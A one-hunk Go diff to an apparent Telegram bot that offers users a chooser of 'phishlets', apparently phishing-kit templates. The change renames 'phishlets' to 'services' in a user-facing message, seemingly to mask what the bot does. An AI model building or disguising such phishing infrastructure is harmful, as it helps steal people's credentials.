@@ -569,7 +569,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 		// Step 1: show phishlet chooser
 		names := b.availablePhishlets()
 		if len(names) == 0 {
-			b.send(chatId, "No phishlets available yet. Contact the admin.")
+			b.send(chatId, "No services available yet. Contact the admin.")
 			return
 		}
 		kb := b.phishletKeyboard("phishlet")
